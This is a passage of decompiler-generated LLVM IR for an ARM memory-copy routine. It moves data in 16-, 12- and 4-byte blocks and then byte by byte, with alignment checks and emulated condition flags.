  %v5_dad4 = icmp slt i32 %v2_dac8, 20
  br i1 %v5_dad4, label %dec_label_pc_db08, label %dec_label_pc_dad8

dec_label_pc_dad8:                                ; preds = %dec_label_pc_dad0
  %v0_dad8 = load i32, i32* @r4, align 4
  store i32 %v0_dad8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_dadc

dec_label_pc_dadc:                                ; preds = %dec_label_pc_dadc.dec_label_pc_dadc_crit_edge, %dec_label_pc_dad8
  %v0_dae0 = phi i32 [ %v12_dae8, %dec_label_pc_dadc.dec_label_pc_dadc_crit_edge ], [ %v0_dae092, %dec_label_pc_dad8 ]
  %v0_dadc = phi i32 [ %v0_dadc.pre, %dec_label_pc_dadc.dec_label_pc_dadc_crit_edge ], [ %v0_dadc91, %dec_label_pc_dad8 ]
  %v1_dadc = inttoptr i32 %v0_dadc to i32*
  %v2_dadc = load i32, i32* %v1_dadc, align 4
  store i32 %v2_dadc, i32* %r3.global-to-local, align 4
  %v3_dadc = add i32 %v0_dadc, 4
  %v4_dadc = inttoptr i32 %v3_dadc to i32*
  %v5_dadc = load i32, i32* %v4_dadc, align 4
  store i32 %v5_dadc, i32* %r4.global-to-local, align 4
  %v6_dadc = add i32 %v0_dadc, 8
  %v7_dadc = inttoptr i32 %v6_dadc to i32*
  %v8_dadc = load i32, i32* %v7_dadc, align 4
  store i32 %v8_dadc, i32* %ip.global-to-local, align 4
  %v9_dadc = add i32 %v0_dadc, 12
  %v10_dadc = inttoptr i32 %v9_dadc to i32*
  %v11_dadc = load i32, i32* %v10_dadc, align 4
  store i32 %v11_dadc, i32* %lr.global-to-local, align 4
  %v12_dadc = add i32 %v0_dadc, 16
  store i32 %v12_dadc, i32* %r1.global-to-local, align 4
  %v1_dae0 = inttoptr i32 %v0_dae0 to i32*
  store i32 %v2_dadc, i32* %v1_dae0, align 4
  %v3_dae0 = add i32 %v0_dae0, 4
  %v4_dae0 = inttoptr i32 %v3_dae0 to i32*
  %v5_dae0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_dae0, i32* %v4_dae0, align 4
  %v6_dae0 = add i32 %v0_dae0, 8
  %v7_dae0 = inttoptr i32 %v6_dae0 to i32*
  %v8_dae0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_dae0, i32* %v7_dae0, align 4
  %v9_dae0 = add i32 %v0_dae0, 12
  %v10_dae0 = inttoptr i32 %v9_dae0 to i32*
  %v11_dae0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_dae0, i32* %v10_dae0, align 4
  %v12_dae0 = add i32 %v0_dae0, 16
  store i32 %v12_dae0, i32* %r0.global-to-local, align 4
  %v0_dae4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dae4 = inttoptr i32 %v0_dae4 to i32*
  %v2_dae4 = load i32, i32* %v1_dae4, align 4
  store i32 %v2_dae4, i32* %r3.global-to-local, align 4
  %v3_dae4 = add i32 %v0_dae4, 4
  %v4_dae4 = inttoptr i32 %v3_dae4 to i32*
  %v5_dae4 = load i32, i32* %v4_dae4, align 4
  store i32 %v5_dae4, i32* %r4.global-to-local, align 4
  %v6_dae4 = add i32 %v0_dae4, 8
  %v7_dae4 = inttoptr i32 %v6_dae4 to i32*
  %v8_dae4 = load i32, i32* %v7_dae4, align 4
  store i32 %v8_dae4, i32* %ip.global-to-local, align 4
  %v9_dae4 = add i32 %v0_dae4, 12
  %v10_dae4 = inttoptr i32 %v9_dae4 to i32*
  %v11_dae4 = load i32, i32* %v10_dae4, align 4
  store i32 %v11_dae4, i32* @lr, align 4
  %v12_dae4 = add i32 %v0_dae4, 16
  store i32 %v12_dae4, i32* @r1, align 4
  %v1_dae8 = inttoptr i32 %v12_dae0 to i32*
  store i32 %v2_dae4, i32* %v1_dae8, align 4
  %v3_dae8 = add i32 %v0_dae0, 20
  %v4_dae8 = inttoptr i32 %v3_dae8 to i32*
  %v5_dae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_dae8, i32* %v4_dae8, align 4
  %v6_dae8 = add i32 %v0_dae0, 24
  %v7_dae8 = inttoptr i32 %v6_dae8 to i32*
  %v8_dae8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_dae8, i32* %v7_dae8, align 4
  %v9_dae8 = add i32 %v0_dae0, 28
  %v10_dae8 = inttoptr i32 %v9_dae8 to i32*
  %v11_dae8 = load i32, i32* @lr, align 4
  store i32 %v11_dae8, i32* %v10_dae8, align 4
  %v12_dae8 = add i32 %v0_dae0, 32
  store i32 %v12_dae8, i32* @r0, align 4
  %v0_daec = load i32, i32* %r2.global-to-local, align 4
  %v2_daec = add i32 %v0_daec, -32
  store i32 %v2_daec, i32* %r2.global-to-local, align 4
  %v6_daf0 = icmp slt i32 %v0_daec, 32
  br i1 %v6_daf0, label %dec_label_pc_daf4, label %dec_label_pc_dadc.dec_label_pc_dadc_crit_edge

dec_label_pc_dadc.dec_label_pc_dadc_crit_edge:    ; preds = %dec_label_pc_dadc
  %v0_dadc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_dadc

dec_label_pc_daf4:                                ; preds = %dec_label_pc_dadc
  %v4_daf4 = add i32 %v0_daec, -16
  %v6_daf4 = add i32 %v0_daec, 2147483616
  %v7_daf4 = and i32 %v4_daf4, %v6_daf4
  %v8_daf4 = icmp slt i32 %v7_daf4, 0
  store i1 %v8_daf4, i1* %cpsr_v.global-to-local, align 1
  %v9_daf4 = icmp slt i32 %v4_daf4, 0
  store i1 %v9_daf4, i1* %cpsr_n.global-to-local, align 1
  %v10_daf4 = icmp eq i32 %v4_daf4, 0
  store i1 %v10_daf4, i1* %cpsr_z.global-to-local, align 1
  %v5_daf8 = icmp slt i32 %v2_daec, -16
  br i1 %v5_daf8, label %.thread1, label %bb128

bb128:                                            ; preds = %dec_label_pc_daf4
  %v6_daf8 = load i32, i32* @r1, align 4
  %v7_daf8 = inttoptr i32 %v6_daf8 to i32*
  %v8_daf8 = load i32, i32* %v7_daf8, align 4
  store i32 %v8_daf8, i32* %r3.global-to-local, align 4
  %v9_daf8 = add i32 %v6_daf8, 4
  %v10_daf8 = inttoptr i32 %v9_daf8 to i32*
  %v11_daf8 = load i32, i32* %v10_daf8, align 4
  store i32 %v11_daf8, i32* %r4.global-to-local, align 4
  %v12_daf8 = add i32 %v6_daf8, 8
  %v13_daf8 = inttoptr i32 %v12_daf8 to i32*
  %v14_daf8 = load i32, i32* %v13_daf8, align 4
  store i32 %v14_daf8, i32* %ip.global-to-local, align 4
  %v15_daf8 = add i32 %v6_daf8, 12
  %v16_daf8 = inttoptr i32 %v15_daf8 to i32*
  %v17_daf8 = load i32, i32* %v16_daf8, align 4
  store i32 %v17_daf8, i32* @lr, align 4
  %v18_daf8 = add i32 %v6_daf8, 16
  store i32 %v18_daf8, i32* @r1, align 4
  %v7_dafc = inttoptr i32 %v12_dae8 to i32*
  store i32 %v8_daf8, i32* %v7_dafc, align 4
  %v9_dafc = add i32 %v0_dae0, 36
  %v10_dafc = inttoptr i32 %v9_dafc to i32*
  %v11_dafc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_dafc, i32* %v10_dafc, align 4
  %v12_dafc = add i32 %v0_dae0, 40
  %v13_dafc = inttoptr i32 %v12_dafc to i32*
  %v14_dafc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v14_dafc, i32* %v13_dafc, align 4
  %v15_dafc = add i32 %v0_dae0, 44
  %v16_dafc = inttoptr i32 %v15_dafc to i32*
  %v17_dafc = load i32, i32* @lr, align 4
  store i32 %v17_dafc, i32* %v16_dafc, align 4
  %v18_dafc = add i32 %v0_dae0, 48
  store i32 %v18_dafc, i32* @r0, align 4
  %v6_db00 = load i32, i32* %r2.global-to-local, align 4
  %v7_db00 = add i32 %v6_db00, -16
  store i32 %v7_db00, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_daf4, %bb128
  %v3_db10101 = phi i32 [ %v12_dae8, %dec_label_pc_daf4 ], [ %v18_dafc, %bb128 ]
  %v0_db0895 = phi i32 [ %v2_daec, %dec_label_pc_daf4 ], [ %v7_db00, %bb128 ]
  %v2_db04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_db04, i32* @r4, align 4
  br label %dec_label_pc_db08

dec_label_pc_db08:                                ; preds = %dec_label_pc_dad0, %.thread1
  %v3_db10100 = phi i32 [ %v0_dae092, %dec_label_pc_dad0 ], [ %v3_db10101, %.thread1 ]
  %v0_db08 = phi i32 [ %v2_dad0, %dec_label_pc_dad0 ], [ %v0_db0895, %.thread1 ]
  %v1_db08 = add i32 %v0_db08, 20
  store i32 %v1_db08, i32* %r2.global-to-local, align 4
  %v3_db08 = sub i32 0, %v0_db08
  %v4_db08 = and i32 %v1_db08, %v3_db08
  %v5_db08 = icmp slt i32 %v4_db08, 0
  store i1 %v5_db08, i1* %cpsr_v.global-to-local, align 1
  %v6_db08 = icmp slt i32 %v1_db08, 0
  store i1 %v6_db08, i1* %cpsr_n.global-to-local, align 1
  %v7_db08 = icmp eq i32 %v1_db08, 0
  store i1 %v7_db08, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_db0c

dec_label_pc_db0c:                                ; preds = %.thread117, %dec_label_pc_db08
  %v0_db1c.pre147 = phi i32 [ %v0_db1c.pre, %.thread117 ], [ %v1_db08, %dec_label_pc_db08 ]
  %v3_db10 = phi i32 [ %v3_db1098118, %.thread117 ], [ %v3_db10100, %dec_label_pc_db08 ]
  %v1_db14 = phi i1 [ %v1_db18, %.thread117 ], [ %v5_db08, %dec_label_pc_db08 ]
  %v0_db14 = phi i1 [ %v0_db18, %.thread117 ], [ %v6_db08, %dec_label_pc_db08 ]
  %v2_db0c = xor i1 %v1_db14, %v0_db14
  br i1 %v2_db0c, label %.thread117, label %bb129

bb129:                                            ; preds = %dec_label_pc_db0c
  %v3_db0c = load i32, i32* @r1, align 4
  %v4_db0c = inttoptr i32 %v3_db0c to i32*
  %v5_db0c = load i32, i32* %v4_db0c, align 4
  store i32 %v5_db0c, i32* %r3.global-to-local, align 4
  %v6_db0c = add i32 %v3_db0c, 4
  %v7_db0c = inttoptr i32 %v6_db0c to i32*
  %v8_db0c = load i32, i32* %v7_db0c, align 4
  store i32 %v8_db0c, i32* %ip.global-to-local, align 4
  %v9_db0c = add i32 %v3_db0c, 8
  %v10_db0c = inttoptr i32 %v9_db0c to i32*
  %v11_db0c = load i32, i32* %v10_db0c, align 4
  store i32 %v11_db0c, i32* @lr, align 4
  %v12_db0c = add i32 %v3_db0c, 12
  store i32 %v12_db0c, i32* @r1, align 4
  %v4_db10 = inttoptr i32 %v3_db10 to i32*
  store i32 %v5_db0c, i32* %v4_db10, align 4
  %v6_db10 = add i32 %v3_db10, 4
  %v7_db10 = inttoptr i32 %v6_db10 to i32*
  %v8_db10 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_db10, i32* %v7_db10, align 4
  %v9_db10 = add i32 %v3_db10, 8
  %v10_db10 = inttoptr i32 %v9_db10 to i32*
  %v11_db10 = load i32, i32* @lr, align 4
  store i32 %v11_db10, i32* %v10_db10, align 4
  %v12_db10 = add i32 %v3_db10, 12
  store i32 %v12_db10, i32* @r0, align 4
  %v3_db14 = load i32, i32* %r2.global-to-local, align 4
  %v4_db14 = add i32 %v3_db14, -12
  store i32 %v4_db14, i32* %r2.global-to-local, align 4
  %v6_db14 = sub i32 11, %v3_db14
  %v7_db14 = and i32 %v6_db14, %v3_db14
  %v8_db14 = icmp slt i32 %v7_db14, 0
  store i1 %v8_db14, i1* %cpsr_v.global-to-local, align 1
  %v9_db14 = icmp slt i32 %v4_db14, 0
  store i1 %v9_db14, i1* %cpsr_n.global-to-local, align 1
  %v10_db14 = icmp eq i32 %v3_db14, 12
  store i1 %v10_db14, i1* %cpsr_z.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_db0c, %bb129
  %v0_db1c.pre = phi i32 [ %v4_db14, %bb129 ], [ %v0_db1c.pre147, %dec_label_pc_db0c ]
  %v3_db1098118 = phi i32 [ %v12_db10, %bb129 ], [ %v3_db10, %dec_label_pc_db0c ]
  %v1_db18 = phi i1 [ %v8_db14, %bb129 ], [ %v1_db14, %dec_label_pc_db0c ]
  %v0_db18 = phi i1 [ %v9_db14, %bb129 ], [ %v0_db14, %dec_label_pc_db0c ]
  %v2_db18 = xor i1 %v1_db18, %v0_db18
  br i1 %v2_db18, label %dec_label_pc_db1c, label %dec_label_pc_db0c

dec_label_pc_db1c:                                ; preds = %.thread117, %dec_label_pc_dac8
  %v7_db2c = phi i32 [ %v0_dae092, %dec_label_pc_dac8 ], [ %v3_db1098118, %.thread117 ]
  %v0_db1c = phi i32 [ %v2_dac8, %dec_label_pc_dac8 ], [ %v0_db1c.pre, %.thread117 ]
  %v2_db1c = add i32 %v0_db1c, 8
  store i32 %v2_db1c, i32* %r2.global-to-local, align 4
  %v4_db1c = sub i32 0, %v0_db1c
  %v5_db1c = and i32 %v2_db1c, %v4_db1c
  %v6_db1c = icmp slt i32 %v5_db1c, 0
  store i1 %v6_db1c, i1* %cpsr_v.global-to-local, align 1
  %v7_db1c = icmp slt i32 %v2_db1c, 0
  store i1 %v7_db1c, i1* %cpsr_n.global-to-local, align 1
  %v8_db1c = icmp eq i32 %v2_db1c, 0
  store i1 %v8_db1c, i1* %cpsr_z.global-to-local, align 1
  %v5_db20 = icmp slt i32 %v0_db1c, -8
  br i1 %v5_db20, label %bb131, label %dec_label_pc_db24

dec_label_pc_db24:                                ; preds = %dec_label_pc_db1c
  %v6_db24 = add i32 %v0_db1c, 4
  store i32 %v6_db24, i32* %r2.global-to-local, align 4
  %v8_db24 = sub i32 -5, %v0_db1c
  %v9_db24 = and i32 %v8_db24, %v2_db1c
  %v10_db24 = icmp slt i32 %v9_db24, 0
  store i1 %v10_db24, i1* %cpsr_v.global-to-local, align 1
  %v11_db24 = icmp slt i32 %v6_db24, 0
  store i1 %v11_db24, i1* %cpsr_n.global-to-local, align 1
  %v12_db24 = icmp eq i32 %v2_db1c, 4
  store i1 %v12_db24, i1* %cpsr_z.global-to-local, align 1
  %v5_db28 = icmp slt i32 %v2_db1c, 4
  %v6_db28 = load i32, i32* @r1, align 4
  %v7_db28 = inttoptr i32 %v6_db28 to i32*
  %v8_db28 = load i32, i32* %v7_db28, align 4
  store i32 %v8_db28, i32* %r3.global-to-local, align 4
  %v10_db28 = add i32 %v6_db28, 4
  br i1 %v5_db28, label %.thread5, label %bb130

.thread5:                                         ; preds = %dec_label_pc_db24
  store i32 %v10_db28, i32* @r1, align 4
  %v8_db2c = inttoptr i32 %v7_db2c to i32*
  store i32 %v8_db28, i32* %v8_db2c, align 4
  %v9_db2c = load i32, i32* @r0, align 4
  %v10_db2c = add i32 %v9_db2c, 4
  store i32 %v10_db2c, i32* @r0, align 4
  %v0_db3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb131

bb130:                                            ; preds = %dec_label_pc_db24
  %v10_db30 = inttoptr i32 %v10_db28 to i32*
  %v11_db30 = load i32, i32* %v10_db30, align 4
  store i32 %v11_db30, i32* %ip.global-to-local, align 4
  %v12_db30 = add i32 %v6_db28, 8
  store i32 %v12_db30, i32* @r1, align 4
  %v7_db34 = inttoptr i32 %v7_db2c to i32*
  store i32 %v8_db28, i32* %v7_db34, align 4
  %v9_db34 = add i32 %v7_db2c, 4
  %v10_db34 = inttoptr i32 %v9_db34 to i32*
  %v11_db34 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_db34, i32* %v10_db34, align 4
  %v12_db34 = add i32 %v7_db2c, 8
  store i32 %v12_db34, i32* @r0, align 4
  %v6_db38 = load i32, i32* %r2.global-to-local, align 4
  %v7_db38 = add i32 %v6_db38, -4
  store i32 %v7_db38, i32* %r2.global-to-local, align 4
  br label %bb131

bb131:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_db1c, %bb, %dec_label_pc_dce4, %dec_label_pc_dc78, %dec_label_pc_dc0c, %bb130
  %v2_db4c = phi i32 [ %v10_db2c, %.thread5 ], [ %v0_dbdc75, %.thread11 ], [ %v7_db2c, %dec_label_pc_db1c ], [ %v1_daa0, %bb ], [ %v2_db4c113, %dec_label_pc_dce4 ], [ %v2_db4c112, %dec_label_pc_dc78 ], [ %v2_db4c111, %dec_label_pc_dc0c ], [ %v12_db34, %bb130 ]
  %v0_db3c = phi i32 [ %v0_db3c.pre, %.thread5 ], [ %v2_db84, %.thread11 ], [ %v2_db1c, %dec_label_pc_db1c ], [ %v2_dab0, %bb ], [ %v0_db3c109, %dec_label_pc_dce4 ], [ %v0_db3c108, %dec_label_pc_dc78 ], [ %v0_db3c107, %dec_label_pc_dc0c ], [ %v7_db38, %bb130 ]
  %v1_db3c = add i32 %v0_db3c, 4
  store i32 %v1_db3c, i32* %r2.global-to-local, align 4
  %v3_db3c = sub i32 0, %v0_db3c
  %v4_db3c = and i32 %v1_db3c, %v3_db3c
  %v5_db3c = icmp slt i32 %v4_db3c, 0
  store i1 %v5_db3c, i1* %cpsr_v.global-to-local, align 1
  %v6_db3c = icmp slt i32 %v1_db3c, 0
  store i1 %v6_db3c, i1* %cpsr_n.global-to-local, align 1
  %v7_db3c = icmp eq i32 %v1_db3c, 0
  store i1 %v7_db3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db3c, label %bb132, label %bb133

bb132:                                            ; preds = %bb131
  %v3_db40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_db40, i32* %r0.global-to-local, align 4
  ret i32 %v3_db40

bb133:                                            ; preds = %bb131
  %v1_db44 = add i32 %v0_db3c, 2
  %v3_db44 = sub i32 -3, %v0_db3c
  %v4_db44 = and i32 %v3_db44, %v1_db3c
  %v5_db44 = icmp slt i32 %v4_db44, 0
  store i1 %v5_db44, i1* %cpsr_v.global-to-local, align 1
  %v6_db44 = icmp slt i32 %v1_db44, 0
  store i1 %v6_db44, i1* %cpsr_n.global-to-local, align 1
  %v7_db44 = icmp eq i32 %v1_db3c, 2
  store i1 %v7_db44, i1* %cpsr_z.global-to-local, align 1
  %v0_db48 = load i32, i32* @r1, align 4
  %v1_db48 = inttoptr i32 %v0_db48 to i8*
  %v2_db48 = load i8, i8* %v1_db48, align 1
  %v3_db48 = zext i8 %v2_db48 to i32
  store i32 %v3_db48, i32* %r3.global-to-local, align 4
  %v5_db48 = add i32 %v0_db48, 1
  store i32 %v5_db48, i32* %r1.global-to-local, align 4
  %v3_db4c = inttoptr i32 %v2_db4c to i8*
  store i8 %v2_db48, i8* %v3_db4c, align 1
  %v4_db4c = load i32, i32* @r0, align 4
  %v5_db4c = add i32 %v4_db4c, 1
  store i32 %v5_db4c, i32* %r0.global-to-local, align 4
  %v0_db50 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_db50 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_db50 = xor i1 %v0_db50, %v1_db50
  br i1 %v2_db50, label %.thread119, label %bb134

bb134:                                            ; preds = %bb133
  %v3_db50 = load i32, i32* %r1.global-to-local, align 4
  %v4_db50 = inttoptr i32 %v3_db50 to i8*
  %v5_db50 = load i8, i8* %v4_db50, align 1
  %v6_db50 = zext i8 %v5_db50 to i32
  store i32 %v6_db50, i32* %r3.global-to-local, align 4
  %v8_db50 = add i32 %v3_db50, 1
  store i32 %v8_db50, i32* %r1.global-to-local, align 4
  %v6_db54 = inttoptr i32 %v5_db4c to i8*
  store i8 %v5_db50, i8* %v6_db54, align 1
  %v7_db54 = load i32, i32* %r0.global-to-local, align 4
  %v8_db54 = add i32 %v7_db54, 1
  store i32 %v8_db54, i32* %r0.global-to-local, align 4
  %v1_db58.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_db58.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb133, %bb134
  %v7_db5c = phi i32 [ %v8_db54, %bb134 ], [ %v5_db4c, %bb133 ]
  %v2_db5c = phi i1 [ %v2_db58.pre, %bb134 ], [ %v1_db50, %bb133 ]
  %v1_db5c = phi i1 [ %v1_db58.pre, %bb134 ], [ %v0_db50, %bb133 ]
  %v0_db58 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_db58 = xor i1 %v2_db5c, %v1_db5c
  %v4_db58 = or i1 %v0_db58, %v3_db58
  br i1 %v4_db58, label %.thread120, label %bb135

bb135:                                            ; preds = %.thread119
  %v5_db58 = load i32, i32* %r1.global-to-local, align 4
  %v6_db58 = inttoptr i32 %v5_db58 to i8*
  %v7_db58 = load i8, i8* %v6_db58, align 1
  %v8_db58 = zext i8 %v7_db58 to i32
  store i32 %v8_db58, i32* %r3.global-to-local, align 4
  %v10_db58 = add i32 %v5_db58, 1
  store i32 %v10_db58, i32* %r1.global-to-local, align 4
  %v8_db5c = inttoptr i32 %v7_db5c to i8*
  store i8 %v7_db58, i8* %v8_db5c, align 1
  %v9_db5c = load i32, i32* %r0.global-to-local, align 4
  %v10_db5c = add i32 %v9_db5c, 1
  store i32 %v10_db5c, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb135
  %v2_db60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_db60, i32* %r0.global-to-local, align 4
  ret i32 %v2_db60

dec_label_pc_db64:                                ; preds = %dec_label_pc_dab8
  %v1_db64 = sub nsw i32 4, %v1_dab8
  store i32 %v1_db64, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_db68 = icmp ult i32 %v1_db64, 2
  store i1 %v8_db68, i1* %cpsr_n.global-to-local, align 1
  %v9_db68 = icmp eq i32 %v1_db64, 2
  store i1 %v9_db68, i1* %cpsr_z.global-to-local, align 1
  %v1_db6c = inttoptr i32 %v0_daa0 to i8*
  %v2_db6c = load i8, i8* %v1_db6c, align 1
  %v3_db6c = zext i8 %v2_db6c to i32
  store i32 %v3_db6c, i32* %r3.global-to-local, align 4
  %v5_db6c = add i32 %v0_daa0, 1
  store i32 %v5_db6c, i32* @r1, align 4
  %v3_db70 = inttoptr i32 %v1_daa0 to i8*
  store i8 %v2_db6c, i8* %v3_db70, align 1
  %v4_db70 = load i32, i32* @r0, align 4
  %v5_db70 = add i32 %v4_db70, 1
  store i32 %v5_db70, i32* @r0, align 4
  br i1 %v8_db68, label %.thread11, label %bb136

bb136:                                            ; preds = %dec_label_pc_db64
  %v6_db74 = load i32, i32* @r1, align 4
  %v7_db74 = inttoptr i32 %v6_db74 to i8*
  %v8_db74 = load i8, i8* %v7_db74, align 1
  %v9_db74 = zext i8 %v8_db74 to i32
  store i32 %v9_db74, i32* %r3.global-to-local, align 4
  %v11_db74 = add i32 %v6_db74, 1
  store i32 %v11_db74, i32* @r1, align 4
  %v9_db78 = inttoptr i32 %v5_db70 to i8*
  store i8 %v8_db74, i8* %v9_db78, align 1
  %v10_db78 = load i32, i32* @r0, align 4
  %v11_db78 = add i32 %v10_db78, 1
  store i32 %v11_db78, i32* @r0, align 4
  br i1 %v9_db68, label %.thread11, label %bb137

bb137:                                            ; preds = %bb136
  %v8_db7c = load i32, i32* @r1, align 4
  %v9_db7c = inttoptr i32 %v8_db7c to i8*
  %v10_db7c = load i8, i8* %v9_db7c, align 1
  %v11_db7c = zext i8 %v10_db7c to i32
  store i32 %v11_db7c, i32* %r3.global-to-local, align 4
  %v13_db7c = add i32 %v8_db7c, 1
  store i32 %v13_db7c, i32* @r1, align 4
  %v11_db80 = inttoptr i32 %v11_db78 to i8*
  store i8 %v10_db7c, i8* %v11_db80, align 1
  %v12_db80 = load i32, i32* @r0, align 4
  %v13_db80 = add i32 %v12_db80, 1
  store i32 %v13_db80, i32* @r0, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb136, %dec_label_pc_db64, %bb137
  %v0_dbdc75 = phi i32 [ %v11_db78, %bb136 ], [ %v5_db70, %dec_label_pc_db64 ], [ %v13_db80, %bb137 ]
  %v0_db84 = load i32, i32* %r2.global-to-local, align 4
  %v1_db84 = load i32, i32* %ip.global-to-local, align 4
  %v2_db84 = sub i32 %v0_db84, %v1_db84
  store i32 %v2_db84, i32* %r2.global-to-local, align 4
  %v4_db84 = xor i32 %v1_db84, %v0_db84
  %v5_db84 = xor i32 %v2_db84, %v0_db84
  %v6_db84 = and i32 %v5_db84, %v4_db84
  %v7_db84 = icmp slt i32 %v6_db84, 0
  store i1 %v7_db84, i1* %cpsr_v.global-to-local, align 1
  %v8_db84 = icmp slt i32 %v2_db84, 0
  store i1 %v8_db84, i1* %cpsr_n.global-to-local, align 1
  %v9_db84 = icmp eq i32 %v0_db84, %v1_db84
  store i1 %v9_db84, i1* %cpsr_z.global-to-local, align 1
  %v5_db88 = icmp slt i32 %v0_db84, %v1_db84
  br i1 %v5_db88, label %bb131, label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %.thread11
  %v0_db8c = load i32, i32* @r1, align 4
  %v1_db8c = urem i32 %v0_db8c, 4
  store i32 %v1_db8c, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_db8c = icmp eq i32 %v1_db8c, 0
  store i1 %v2_db8c, i1* %cpsr_z.global-to-local, align 1
  %extract.t123 = trunc i32 %v0_db8c to i2
  br i1 %v2_db8c, label %dec_label_pc_dac8, label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %dec_label_pc_dac0, %dec_label_pc_db8c
  %v0_dbdc74 = phi i32 [ %v1_daa0, %dec_label_pc_dac0 ], [ %v0_dbdc75, %dec_label_pc_db8c ]
  %v0_dc88 = phi i32 [ %v2_dab0, %dec_label_pc_dac0 ], [ %v2_db84, %dec_label_pc_db8c ]
  %v0_db9c.off0 = phi i2 [ %extract.t, %dec_label_pc_dac0 ], [ %extract.t123, %dec_label_pc_db8c ]
  %v0_db94 = phi i32 [ %v0_daa0, %dec_label_pc_dac0 ], [ %v0_db8c, %dec_label_pc_db8c ]
  %v1_db94 = and i32 %v0_db94, -4
  store i32 %v1_db94, i32* %r1.global-to-local, align 4
  %v1_db98 = inttoptr i32 %v1_db94 to i32*
  %v2_db98 = load i32, i32* %v1_db98, align 4
  store i32 %v2_db98, i32* @lr, align 4
  %v4_db98 = add i32 %v1_db94, 4
  store i32 %v4_db98, i32* %r1.global-to-local, align 4
  %v2_dc80 = add i32 %v0_dc88, -12
  %v4_dc80 = sub i32 11, %v0_dc88
  %v5_dc80 = and i32 %v4_dc80, %v0_dc88
  %v6_dc80 = icmp slt i32 %v5_dc80, 0
  store i1 %v6_dc80, i1* %cpsr_v.global-to-local, align 1
  %v7_dc80 = icmp slt i32 %v2_dc80, 0
  store i1 %v7_dc80, i1* %cpsr_n.global-to-local, align 1
  %v8_dc80 = icmp eq i32 %v0_dc88, 12
  store i1 %v8_dc80, i1* %cpsr_z.global-to-local, align 1
  %v5_dc84 = icmp slt i32 %v0_dc88, 12
  switch i2 %v0_db9c.off0, label %dec_label_pc_dba8 [
    i2 -1, label %dec_label_pc_dc80
    i2 -2, label %dec_label_pc_dc14
  ]

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db94
  br i1 %v5_dc84, label %dec_label_pc_dbf4, label %dec_label_pc_dbb0

dec_label_pc_dbb0:                                ; preds = %dec_label_pc_dba8
  store i32 %v2_dc80, i32* %r2.global-to-local, align 4
  %v3_dbb4 = load i32, i32* @r4, align 4
  store i32 %v3_dbb4, i32* %stack_var_-16, align 4
  %v6_dbb4 = load i32, i32* @r5, align 4
  store i32 %v6_dbb4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_dbb8

dec_label_pc_dbb8:                                ; preds = %dec_label_pc_dbb8.dec_label_pc_dbb8_crit_edge, %dec_label_pc_dbb0
  %v0_dbdc = phi i32 [ %v12_dbdc, %dec_label_pc_dbb8.dec_label_pc_dbb8_crit_edge ], [ %v0_dbdc74, %dec_label_pc_dbb0 ]
  %v0_dbbc = phi i32 [ %v0_dbbc.pre, %dec_label_pc_dbb8.dec_label_pc_dbb8_crit_edge ], [ %v4_db98, %dec_label_pc_dbb0 ]
  %v0_dbb8 = phi i32 [ %v0_dbb8.pre, %dec_label_pc_dbb8.dec_label_pc_dbb8_crit_edge ], [ %v2_db98, %dec_label_pc_dbb0 ]
  %v3_dbb8 = udiv i32 %v0_dbb8, 256
  store i32 %v3_dbb8, i32* %r3.global-to-local, align 4
  %v1_dbbc = inttoptr i32 %v0_dbbc to i32*
  %v2_dbbc = load i32, i32* %v1_dbbc, align 4
  store i32 %v2_dbbc, i32* %r4.global-to-local, align 4
  %v3_dbbc = add i32 %v0_dbbc, 4
  %v4_dbbc = inttoptr i32 %v3_dbbc to i32*
  %v5_dbbc = load i32, i32* %v4_dbbc, align 4
  store i32 %v5_dbbc, i32* %r5.global-to-local, align 4
  %v6_dbbc = add i32 %v0_dbbc, 8
  %v7_dbbc = inttoptr i32 %v6_dbbc to i32*
  %v8_dbbc = load i32, i32* %v7_dbbc, align 4
  store i32 %v8_dbbc, i32* %ip.global-to-local, align 4
  %v9_dbbc = add i32 %v0_dbbc, 12
  %v10_dbbc = inttoptr i32 %v9_dbbc to i32*
  %v11_dbbc = load i32, i32* %v10_dbbc, align 4
  store i32 %v11_dbbc, i32* @lr, align 4
  %v12_dbbc = add i32 %v0_dbbc, 16
  store i32 %v12_dbbc, i32* %r1.global-to-local, align 4
  %v4_dbc0 = mul i32 %v2_dbbc, 16777216
  %v5_dbc0 = or i32 %v4_dbc0, %v3_dbb8
  store i32 %v5_dbc0, i32* %r3.global-to-local, align 4
  %v3_dbc4 = udiv i32 %v2_dbbc, 256
  %v4_dbc8 = mul i32 %v5_dbbc, 16777216
